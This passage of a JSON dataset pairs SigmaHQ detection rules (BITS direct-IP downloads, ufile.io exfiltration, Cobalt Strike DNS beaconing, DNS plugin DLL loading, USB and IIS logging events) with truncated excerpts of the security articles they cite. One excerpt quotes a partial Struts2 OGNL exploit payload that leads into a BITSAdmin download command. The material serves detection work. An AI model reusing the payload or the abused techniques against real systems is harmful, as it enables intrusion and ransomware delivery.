        "condition": "selection and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\bits_client\\win_bits_client_new_transfer_via_ip_address.yml"
  },
  "722": {
    "url": "https://isc.sans.edu/diary/22264",
    "markdown": "# Internet Storm Center ## Threat Level: green --- # Java Struts2 Vulnerability Used To Install Cerber Crypto Ransomware **Published**: 2017-04-06. **Last Updated**: 2017-04-06 1 comment(s) --- We do have a special webcast about the Struts2 Vulnerability scheduled for 11am ET today. Sign up here. Since about a month, we are tracking numerous attempts to exploit the Java Struts2 vulnerability (CVE-2017-5638). Typically, the exploits targeted Unix systems with simple Perl backdoors and bots. But recently, I saw a number of exploit attempts targeting Windows systems using a variant of the Cerber ransomware. ``` %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' <strong> <span style=\"color:#c0392b\"> BITSAdmin.exe /Transfer JOB",
    "sigma_rule": {
      "title": "BITS Transfer Job Download From Direct IP",
      "id": "90f138c1-f578-4ac3-8c49-eecfd847c8b7",
      "related": [
        {
          "id": "99c840f2-2012-46fd-9141-c761987550ef",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a BITS transfer job downloading file(s) from a direct IP address.",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2023-03-27",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "service": "bits-client"
      },
      "detection": {
        "selection": {
          "EventID": 16403,
          "RemoteName|contains": [
            "http://1",
            "http://2",
            "http://3",
            "http://4",
            "http://5",
            "http://6",
            "http://7",
            "http://8",
            "http://9",
            "https://1",
            "https://2",
            "https://3",
            "https://4",
            "https://5",
            "https://6",
            "https://7",
            "https://8",
            "https://9"
          ]
        },
        "filter_optional_local_networks": {
          "RemoteName|contains": [
            "://10.",
            "://192.168.",
            "://172.16.",
            "://172.17.",
            "://172.18.",
            "://172.19.",
            "://172.20.",
            "://172.21.",
            "://172.22.",
            "://172.23.",
            "://172.24.",
            "://172.25.",
            "://172.26.",
            "://172.27.",
            "://172.28.",
            "://172.29.",
            "://172.30.",
            "://172.31.",
            "://127.",
            "://169.254."
          ]
        },
        "filter_optional_seven_zip": {
          "RemoteName|contains": [
            "https://7-",
            "http://7-"
          ]
        },
        "condition": "selection and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\bits_client\\win_bits_client_new_transfer_via_ip_address.yml"
  },
  "723": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
    "markdown": "# /Bitsadmin.exe - Alternate data streams - Download - Copy - Execute Used for managing background intelligent transfer ## Paths: - C:\\Windows\\System32\\bitsadmin.exe - C:\\Windows\\SysWOW64\\bitsadmin.exe ## Resources: - https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679 - https://www.youtube.com/watch?v=_8xJaaQlpBo - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f ## Detections: - Sigma: proc_creation_win_bitsadmin_download.yml - Sigma: proxy_ua_bitsadmin_susp_tld.yml - Sigma: proc_creation_win_bitsadmin_potential_persistence.yml - Splunk: bitsadmin_download_file.yml - IOC: Child process from bitsadmin.exe - IOC: bitsadmin creates new files - IOC: bitsadmin adds data to alternate data stream ## Alternate data streams ### Create a bitsadmin job 1. Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data",
    "sigma_rule": {
      "title": "BITS Transfer Job Download From Direct IP",
      "id": "90f138c1-f578-4ac3-8c49-eecfd847c8b7",
      "related": [
        {
          "id": "99c840f2-2012-46fd-9141-c761987550ef",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a BITS transfer job downloading file(s) from a direct IP address.",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2023-03-27",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "service": "bits-client"
      },
      "detection": {
        "selection": {
          "EventID": 16403,
          "RemoteName|contains": [
            "http://1",
            "http://2",
            "http://3",
            "http://4",
            "http://5",
            "http://6",
            "http://7",
            "http://8",
            "http://9",
            "https://1",
            "https://2",
            "https://3",
            "https://4",
            "https://5",
            "https://6",
            "https://7",
            "https://8",
            "https://9"
          ]
        },
        "filter_optional_local_networks": {
          "RemoteName|contains": [
            "://10.",
            "://192.168.",
            "://172.16.",
            "://172.17.",
            "://172.18.",
            "://172.19.",
            "://172.20.",
            "://172.21.",
            "://172.22.",
            "://172.23.",
            "://172.24.",
            "://172.25.",
            "://172.26.",
            "://172.27.",
            "://172.28.",
            "://172.29.",
            "://172.30.",
            "://172.31.",
            "://127.",
            "://169.254."
          ]
        },
        "filter_optional_seven_zip": {
          "RemoteName|contains": [
            "https://7-",
            "http://7-"
          ]
        },
        "condition": "selection and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\bits_client\\win_bits_client_new_transfer_via_ip_address.yml"
  },
  "724": {
    "url": "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/",
    "markdown": "# Breaking the silence - Recent Truebot activity December 8, 2022 Since August 2022, we have seen an increase in infections of Truebot (aka Silence.Downloader) malware. Truebot was first identified in 2017 and researchers have linked it to a threat actor called Silence Group that is responsible for several high-impact attacks on financial institutions in several countries around the world. There are claims by other researchers that this group is associated with the well-known threat actor TA505 (aka Evil Corp). In our research, we found that one of the new follow-on payloads that Truebot drops is Grace (aka FlawedGrace and",
    "sigma_rule": {
      "title": "BITS Transfer Job Download From Direct IP",
      "id": "90f138c1-f578-4ac3-8c49-eecfd847c8b7",
      "related": [
        {
          "id": "99c840f2-2012-46fd-9141-c761987550ef",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a BITS transfer job downloading file(s) from a direct IP address.",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2023-03-27",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "service": "bits-client"
      },
      "detection": {
        "selection": {
          "EventID": 16403,
          "RemoteName|contains": [
            "http://1",
            "http://2",
            "http://3",
            "http://4",
            "http://5",
            "http://6",
            "http://7",
            "http://8",
            "http://9",
            "https://1",
            "https://2",
            "https://3",
            "https://4",
            "https://5",
            "https://6",
            "https://7",
            "https://8",
            "https://9"
          ]
        },
        "filter_optional_local_networks": {
          "RemoteName|contains": [
            "://10.",
            "://192.168.",
            "://172.16.",
            "://172.17.",
            "://172.18.",
            "://172.19.",
            "://172.20.",
            "://172.21.",
            "://172.22.",
            "://172.23.",
            "://172.24.",
            "://172.25.",
            "://172.26.",
            "://172.27.",
            "://172.28.",
            "://172.29.",
            "://172.30.",
            "://172.31.",
            "://127.",
            "://169.254."
          ]
        },
        "filter_optional_seven_zip": {
          "RemoteName|contains": [
            "https://7-",
            "http://7-"
          ]
        },
        "condition": "selection and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\bits_client\\win_bits_client_new_transfer_via_ip_address.yml"
  },
  "725": {
    "url": "https://thedfirreport.com/2021/12/13/diavol-ransomware/",
    "markdown": "# Diavol Ransomware In the past, threat actors have used BazarLoader to deploy Ryuk and Conti ransomware, as reported on many occasions. In this intrusion, however, a BazarLoader infection resulted in deployment of Diavol Ransomware. First discovered in June 2021, by FortiGuard Labs, Diavol Ransomware has been suspected to be linked to the Wizard Spider threat actor. In this report, we observed threat actors deploy multiple Cobalt Strike DLL beacons, perform internal discovery using Windows utilities, execute lateral movement using AnyDesk and RDP, dump credentials multiple ways, exfiltrate data and deploy domain wide ransomware in as little as 32 hours",
    "sigma_rule": {
      "title": "DNS Query To Ufile.io - DNS Client",
      "id": "090ffaad-c01a-4879-850c-6d57da98452d",
      "related": [
        {
          "id": "1cbbeaaf-3c8c-4e4c-9d72-49485b6a176b",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects DNS queries to \"ufile.io\", which was seen abused by malware and threat actors as a method for data exfiltration",
      "references": [
        "https://thedfirreport.com/2021/12/13/diavol-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-16",
      "modified": "2023-09-18",
      "tags": [
        "attack.exfiltration",
        "attack.t1567.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "dns-client",
        "definition": "Requirements: Microsoft-Windows-DNS Client Events/Operational Event Log must be enabled/collected in order to receive the events."
      },
      "detection": {
        "selection": {
          "EventID": 3008,
          "QueryName|contains": "ufile.io"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "DNS queries for \"ufile\" are not malicious by nature necessarily. Investigate the source to determine the necessary actions to take"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\dns_client\\win_dns_client_ufile_io.yml"
  },
  "726": {
    "url": "https://web.archive.org/web/20220203133326/https://atr-blog.gigamon.com/2017/07/25/footprints-of-fin7-tracking-actor-patterns-part-1/?utm_campaign=icebrgweb-redirect&utm_source=icebrg.io-blog-footprints-of-fin7-tracking-actor-patterns&utm_medium=referral",
    "markdown": "# Footprints of Fin7: Tracking Actor Patterns (Part 1) **Published**: July 25, 2017 --- The following blog post and research was originally published by ICEBRG prior to being acquired by Gigamon on July 24th, 2018. --- The 2017 Verizon DBIR Report states that 73 percent of breaches in 2016 were financially motivated and span a number of different industries and financial targets. Since 2015, a financially motivated threat group known as FIN7 (also referred to as the Carbanak Group) has emerged from the shadows and has been highlighted in a number of different incidents. This group is a moderately sophisticated",
    "sigma_rule": {
      "title": "Suspicious Cobalt Strike DNS Beaconing - DNS Client",
      "id": "0d18728b-f5bf-4381-9dcf-915539fff6c2",
      "related": [
        {
          "id": "f356a9c4-effd-4608-bbf8-408afd5cd006",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a program that invoked suspicious DNS queries known from Cobalt Strike beacons",
      "references": [
        "https://web.archive.org/web/20220203133326/https://atr-blog.gigamon.com/2017/07/25/footprints-of-fin7-tracking-actor-patterns-part-1/?utm_campaign=icebrgweb-redirect&utm_source=icebrg.io-blog-footprints-of-fin7-tracking-actor-patterns&utm_medium=referral",
        "https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-16",
      "tags": [
        "attack.command-and-control",
        "attack.t1071.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "dns-client",
        "definition": "Requirements: Microsoft-Windows-DNS Client Events/Operational Event Log must be enabled/collected in order to receive the events."
      },
      "detection": {
        "selection_eid": {
          "EventID": 3008
        },
        "selection_query_1": {
          "QueryName|startswith": [
            "aaa.stage.",
            "post.1"
          ]
        },
        "selection_query_2": {
          "QueryName|contains": ".stage.123456."
        },
        "condition": "selection_eid and 1 of selection_query_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\dns_client\\win_dns_client__mal_cobaltstrike.yml"
  },
  "727": {
    "url": "https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/",
    "markdown": "# Hunting and detecting Cobalt Strike In the last SEKOIA.IO Threat & Detection Lab we dealt with a Man-in-the-middle (MITM) phishing attack leveraging Evilginx2, an offensive tool allowing two-factor authentication bypass. Here, we are tackling a much bigger threat given the frequency it is abused by diverse threat actors. In this blogpost, we describe step by step how to ensure a **proactive and defensive posture** against Cobalt Strike, one of the most powerful pentesting tools hijacked by attackers in their numerous campaigns. We show examples of how to track Cobalt Strike command and control servers (C2) and Malleable profiles by",
    "sigma_rule": {
      "title": "Suspicious Cobalt Strike DNS Beaconing - DNS Client",
      "id": "0d18728b-f5bf-4381-9dcf-915539fff6c2",
      "related": [
        {
          "id": "f356a9c4-effd-4608-bbf8-408afd5cd006",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a program that invoked suspicious DNS queries known from Cobalt Strike beacons",
      "references": [
        "https://web.archive.org/web/20220203133326/https://atr-blog.gigamon.com/2017/07/25/footprints-of-fin7-tracking-actor-patterns-part-1/?utm_campaign=icebrgweb-redirect&utm_source=icebrg.io-blog-footprints-of-fin7-tracking-actor-patterns&utm_medium=referral",
        "https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-16",
      "tags": [
        "attack.command-and-control",
        "attack.t1071.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "dns-client",
        "definition": "Requirements: Microsoft-Windows-DNS Client Events/Operational Event Log must be enabled/collected in order to receive the events."
      },
      "detection": {
        "selection_eid": {
          "EventID": 3008
        },
        "selection_query_1": {
          "QueryName|startswith": [
            "aaa.stage.",
            "post.1"
          ]
        },
        "selection_query_2": {
          "QueryName|contains": ".stage.123456."
        },
        "condition": "selection_eid and 1 of selection_query_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\dns_client\\win_dns_client__mal_cobaltstrike.yml"
  },
  "728": {
    "url": "https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83",
    "markdown": "# Feature, not bug: DNSAdmin to DC compromise in one line **May 8, 2017** --- ## Background In addition to implementing their own DNS server, Microsoft has also implemented their own management protocol for that server, to allow for easy management and integration with Active Directory domains. By default, domain controllers are also DNS servers; DNS servers need to be reachable and usable by mostly every domain user. This, in turn, exposes quite some attack surface on domain controllers — on one part, the DNS protocol itself and on the other, the management protocol, which is based on RPC. We",
    "sigma_rule": {
      "title": "DNS Server Error Failed Loading the ServerLevelPluginDLL",
      "id": "cbe51394-cd93-4473-b555-edf0144952d9",
      "related": [
        {
          "id": "e61e8a88-59a9-451c-874e-70fcc9740d67",
          "type": "derived"
        },
        {
          "id": "f63b56ee-3f79-4b8a-97fb-5c48007e8573",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects a DNS server error in which a specified plugin DLL (in registry) could not be loaded",
      "references": [
        "https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83",
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/cc735829(v=ws.10)",
        "https://twitter.com/gentilkiwi/status/861641945944391680"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2017-05-08",
      "modified": "2023-02-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "dns-server"
      },
      "detection": {
        "selection": {
          "EventID": [
            150,
            770,
            771
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\dns_server\\win_dns_server_susp_server_level_plugin_dll.yml"
  },
  "729": {
    "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/cc735829(v=ws.10)",
    "markdown": "# Event ID 150 — DNS Server Configuration **Applies To:** Windows Server 2008 The DNS server configuration consists of the settings that determine how the DNS server will function on a network and how those settings are stored and retrieved when they are needed. ## Event Details | **Product:** | Windows Operating System | | ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | | **ID:** | 150 | | **Source:** | Microsoft-Windows-DNS-Server-Service | | **Version:** | 6.0 | | **Symbolic Name:** | DNS_EVENT_PLUGIN_INIT_FAILED | | **Message:** | The DNS server could not load or initialize the plug-in DLL %1. The event data is the",
    "sigma_rule": {
      "title": "DNS Server Error Failed Loading the ServerLevelPluginDLL",
      "id": "cbe51394-cd93-4473-b555-edf0144952d9",
      "related": [
        {
          "id": "e61e8a88-59a9-451c-874e-70fcc9740d67",
          "type": "derived"
        },
        {
          "id": "f63b56ee-3f79-4b8a-97fb-5c48007e8573",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects a DNS server error in which a specified plugin DLL (in registry) could not be loaded",
      "references": [
        "https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83",
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/cc735829(v=ws.10)",
        "https://twitter.com/gentilkiwi/status/861641945944391680"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2017-05-08",
      "modified": "2023-02-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "dns-server"
      },
      "detection": {
        "selection": {
          "EventID": [
            150,
            770,
            771
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\dns_server\\win_dns_server_susp_server_level_plugin_dll.yml"
  },
  "730": {
    "url": "https://twitter.com/gentilkiwi/status/861641945944391680",
    "markdown": "# Post May 8, 2017 I don't know on all Windows versions, but on a 2016, eventid 770 & 771 are good indicators! ```image Description: The image is a screenshot from the Windows Event Viewer, specifically under the 'DNS Server' logs. It displays a list of events with their corresponding details, including event IDs 770 and 771, which are highlighted as relevant indicators. The log entries show various events occurring on May 8, 2017, at 19:56:01, with the source being 'DNS-Server-Service.' The lower section provides additional details about event ID 770, indicating an action performed by a DLL plugin related",
    "sigma_rule": {
      "title": "DNS Server Error Failed Loading the ServerLevelPluginDLL",
      "id": "cbe51394-cd93-4473-b555-edf0144952d9",
      "related": [
        {
          "id": "e61e8a88-59a9-451c-874e-70fcc9740d67",
          "type": "derived"
        },
        {
          "id": "f63b56ee-3f79-4b8a-97fb-5c48007e8573",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects a DNS server error in which a specified plugin DLL (in registry) could not be loaded",
      "references": [
        "https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83",
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/cc735829(v=ws.10)",
        "https://twitter.com/gentilkiwi/status/861641945944391680"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2017-05-08",
      "modified": "2023-02-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "dns-server"
      },
      "detection": {
        "selection": {
          "EventID": [
            150,
            770,
            771
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\dns_server\\win_dns_server_susp_server_level_plugin_dll.yml"
  },
  "731": {
    "url": "https://web.archive.org/web/20240720022948/https://df-stream.com/2014/01/the-windows-7-event-log-and-usb-device/",
    "markdown": "# The Windows 7 Event Log and USB Device Tracking **January 3, 2014** --- Recently, there have been a few blog posts discussing evidence found on a system when USB devices are connected and removed (Yogesh Khatri’s blog series and Nicole Ibrahim’s blog). I’ve been meaning to release this post for a while, and Yogesh and Nicole’s posts have motivated me to do so. Much of the conversation regarding USB device activity on a Windows system often surrounds the registry, but the Windows 7 Event Log can provide a wealth of information in addition to the registry. Utilizing the Event",
    "sigma_rule": {
      "title": "USB Device Plugged",
      "id": "1a4bd6e3-4c6e-405d-a9a3-53a116e341d4",
      "status": "test",
      "description": "Detects plugged/unplugged USB devices",
      "references": [
        "https://web.archive.org/web/20240720022948/https://df-stream.com/2014/01/the-windows-7-event-log-and-usb-device/",
        "https://www.techrepublic.com/article/how-to-track-down-usb-flash-drive-usage-in-windows-10s-event-viewer/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2017-11-09",
      "modified": "2021-11-30",
      "tags": [
        "attack.initial-access",
        "attack.t1200"
      ],
      "logsource": {
        "product": "windows",
        "service": "driver-framework",
        "definition": "Requires enabling and collection of the Microsoft-Windows-DriverFrameworks-UserMode/Operational eventlog"
      },
      "detection": {
        "selection": {
          "EventID": [
            2003,
            2100,
            2102
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate administrative activity"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\driverframeworks\\win_usb_device_plugged.yml"
  },
  "732": {
    "url": "https://www.techrepublic.com/article/how-to-track-down-usb-flash-drive-usage-in-windows-10s-event-viewer/",
    "markdown": "# How to track down USB flash drive usage with Windows 10’s Event Viewer **Published** *April 3, 2017* --- Whether you're conducting a digital forensics investigation or troubleshooting USB flash drive connections, Event Viewer can provide what you need. Soon after my article How to track down USB devices in Windows 10 with Microsoft’s USB Device Viewer was published, I received a message from a reader who was interested in tracking USB flash drive usage. More specifically, he wanted to be able to find out when a USB flash drive was connected to a system, when it was disconnected, and",
    "sigma_rule": {
      "title": "USB Device Plugged",
      "id": "1a4bd6e3-4c6e-405d-a9a3-53a116e341d4",
      "status": "test",
      "description": "Detects plugged/unplugged USB devices",
      "references": [
        "https://web.archive.org/web/20240720022948/https://df-stream.com/2014/01/the-windows-7-event-log-and-usb-device/",
        "https://www.techrepublic.com/article/how-to-track-down-usb-flash-drive-usage-in-windows-10s-event-viewer/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2017-11-09",
      "modified": "2021-11-30",
      "tags": [
        "attack.initial-access",
        "attack.t1200"
      ],
      "logsource": {
        "product": "windows",
        "service": "driver-framework",
        "definition": "Requires enabling and collection of the Microsoft-Windows-DriverFrameworks-UserMode/Operational eventlog"
      },
      "detection": {
        "selection": {
          "EventID": [
            2003,
            2100,
            2102
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate administrative activity"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\driverframeworks\\win_usb_device_plugged.yml"
  },
  "733": {
    "url": "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
    "markdown": "# Configure Logging in IIS by Keith Newman and Robert McMurray You can configure logging on your web server or website that records information about HTTP requests and errors. The information in your log can help you troubleshoot or optimize your website. ## Prerequisites To get the most from this tutorial, you must have access to a computer that is running one of the following operating systems: - Windows Server® 2012 - Windows® 8 ## Configure Logging at the Site Level You can perform this procedure by using the user interface (UI), or by editing configuration files directly. ### To",
    "sigma_rule": {
      "title": "ETW Logging/Processing Option Disabled On IIS Server",
      "id": "a5b40a90-baf5-4bf7-a6f7-373494881d22",
      "status": "experimental",
      "description": "Detects changes to of the IIS server configuration in order to disable/remove the ETW logging/processing option.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/sitedefaults/logfile/"
      ],
      "author": "frack113, Nasreddine Bencherchali",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration|endswith": "@logTargetW3C",
          "OldValue|contains": "ETW"
        },
        "filter_main_etw_added": {
          "NewValue|contains": "ETW"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate administrator activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_logging_etw_disabled.yml"
  },
  "734": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
    "markdown": "# IIS modules: The evolution of web shells and how to detect them **December 12, 2022** --- The Microsoft Detection and Response Team (DART) has been renamed to Microsoft Incident Response (Microsoft IR). For more information on IR services, go to Microsoft Incident Response. Web exploitation and web shells are some of the most common entry points in the current threat landscape. Web servers provide an external avenue directly into your corporate network, which often results in web servers being an initial intrusion vector or mechanism of persistence. Monitoring for exploitation and web shells should be a high priority for",
    "sigma_rule": {
      "title": "ETW Logging/Processing Option Disabled On IIS Server",
      "id": "a5b40a90-baf5-4bf7-a6f7-373494881d22",
      "status": "experimental",
      "description": "Detects changes to of the IIS server configuration in order to disable/remove the ETW logging/processing option.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/sitedefaults/logfile/"
      ],
      "author": "frack113, Nasreddine Bencherchali",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration|endswith": "@logTargetW3C",
          "OldValue|contains": "ETW"
        },
        "filter_main_etw_added": {
          "NewValue|contains": "ETW"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate administrator activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_logging_etw_disabled.yml"
  },
  "735": {
    "url": "https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/sitedefaults/logfile/",
    "markdown": "# Default Log File Settings for Web Sites <logFile> ## Overview The `<logFile>` element of the `<siteDefaults>` element contains attributes that allow you to configure default logging for a site on IIS 7 and later. For example, you can enable or disable logging, configure the format of the IIS log file, specify the categories of information to store in the log file, and change the directory where the log file is stored. You can also use the `<logFile>` element to control how often IIS creates a new log file based either on log file size or time interval and the",
    "sigma_rule": {
      "title": "ETW Logging/Processing Option Disabled On IIS Server",
      "id": "a5b40a90-baf5-4bf7-a6f7-373494881d22",
      "status": "experimental",
      "description": "Detects changes to of the IIS server configuration in order to disable/remove the ETW logging/processing option.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/sitedefaults/logfile/"
      ],
      "author": "frack113, Nasreddine Bencherchali",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration|endswith": "@logTargetW3C",
          "OldValue|contains": "ETW"
        },
        "filter_main_etw_added": {
          "NewValue|contains": "ETW"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate administrator activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_logging_etw_disabled.yml"
  },
  "736": {
    "url": "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
    "markdown": "# Configure Logging in IIS by Keith Newman and Robert McMurray You can configure logging on your web server or website that records information about HTTP requests and errors. The information in your log can help you troubleshoot or optimize your website. ## Prerequisites To get the most from this tutorial, you must have access to a computer that is running one of the following operating systems: - Windows Server® 2012 - Windows® 8 ## Configure Logging at the Site Level You can perform this procedure by using the user interface (UI), or by editing configuration files directly. ### To",
    "sigma_rule": {
      "title": "HTTP Logging Disabled On IIS Server",
      "id": "e8ebd53a-30c2-45bd-81bb-74befba07bdb",
      "status": "experimental",
      "description": "Detects changes to of the IIS server configuration in order to disable HTTP logging for successful requests.",
      "references": [
